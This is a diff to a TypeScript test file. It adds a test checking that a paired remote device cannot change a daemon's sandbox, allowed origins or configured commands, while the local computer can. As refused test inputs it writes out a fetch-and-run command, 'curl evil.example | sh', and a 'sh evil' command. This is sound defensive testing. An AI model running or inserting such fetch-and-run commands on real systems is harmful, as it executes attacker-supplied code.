@@ -4,7 +4,7 @@ import { chmodSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync }
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { plainWords } from "@overhand/themes";
-import { parseConfig } from "../src/config";
+import { parseConfig, saveConfig } from "../src/config";
 import { addRequest, forgetRun, insideRun, RUN_KEY_ENV, RUN_KEY_HEADER, recordRun, recordSpawn, runKey, saveBeat } from "../src/control";
 import { heldForOwner } from "../src/control-api";
 import { openCli, tunnelHint } from "../src/daemon";
@@ -21,7 +21,7 @@ import {
   resetLocalKey,
   useOpenLink,
 } from "../src/devices";
-import { CFG, OPS, UI_PORT } from "../src/env";
+import { applyConfig, CFG, OPS, UI_PORT } from "../src/env";
 import { handle } from "../src/server";
 import { localRequest } from "./local";
 
@@ -333,6 +333,41 @@ test("a paired phone can't mint codes or serve the tailnet, and its POSTs still 
   expect((await remote("/api/devices/revoke", { body: { id: "x" }, cookie, origin: "https://evil.example" })).status).toBe(403);
   expect((await remote("/api/pair", { body: { code: "X" }, origin: "https://evil.example" })).status).toBe(403);
 });
+
+test("a paired device can't change what the daemon runs, the sandbox or the allowed addresses; the computer can", async () => {
+  const cookie = await pair();
+  const settings = (await (await remote("/api/settings", { cookie })).json()) as { local: boolean; config: typeof CFG };
+  expect(settings.local).toBe(false);
+  expect(((await (await local("/api/settings")).json()) as { local: boolean }).local).toBe(true);
+  const config = structuredClone(CFG);
+  expect(config.clients.length).toBeGreaterThan(0);
+  const changes = [
+    { ...config, sandbox: { ...config.sandbox, mode: config.sandbox.mode === "off" ? "enforce" : "off" } },
+    { ...config, dashboardOrigins: [PHONE, "https://evil.example"] },
+    {
+      ...config,
+      cleanup: {
+        ...config.cleanup,
+        categories: { ...config.cleanup.categories, caches: { ...config.cleanup.categories.caches, commands: ["curl evil.example | sh"] } },
+      },
+    },
+    { ...config, clients: config.clients.map((c, i) => (i === 0 ? { ...c, preview: { command: "sh evil", url: "" } } : c)) },
+    { ...config, clients: config.clients.map((c, i) => (i === 0 ? { ...c, sandbox: "off" } : c)) },
+  ];
+  for (const next of changes) {
+    const r = await remote("/api/settings", { body: { config: next }, cookie });
+    expect(r.status).toBe(403);
+    expect(await r.json()).toEqual({ error: plainWords.changeOnComputer });
+  }
+  expect(CFG.dashboardOrigins).toEqual([PHONE]);
+  // the rest of the form still saves from a device, and the same change saves from the computer
+  const ok = await remote("/api/settings", { body: { config: { ...config, ntfySecret: "ntfy-test" } }, cookie });
+  expect(ok.status).toBe(200);
+  const here = await local("/api/settings", { config: { ...CFG, dashboardOrigins: [PHONE, "https://other.example"] } });
+  expect(here.status).toBe(200);
+  expect(CFG.dashboardOrigins).toContain("https://other.example");
+  applyConfig(saveConfig(OPS, config));
+}, 30_000);
 
 test("a revoked device is refused at once", async () => {
   const cookie = await pair();
